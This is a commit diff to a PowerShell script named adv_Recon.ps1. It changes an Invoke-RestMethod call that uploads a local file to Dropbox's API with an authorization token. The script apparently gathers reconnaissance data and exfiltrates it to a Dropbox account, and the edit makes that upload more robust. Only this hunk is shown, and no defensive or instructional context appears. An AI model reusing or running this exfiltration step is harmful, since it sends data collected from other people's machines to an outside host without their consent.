def0c6da36b85dc1bf9836f59f4c2fc5e0430be0
b <brandon_guevara95@hotmail.com>
2022-12-28 15:02:09 -0600

    Update adv_Recon.ps1

--- adv_Recon.ps1
+++ adv_Recon.ps1
@@ -377,7 +377,7 @@ $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers -usebasicparsing
 
 ############################################################################################################################################################
 
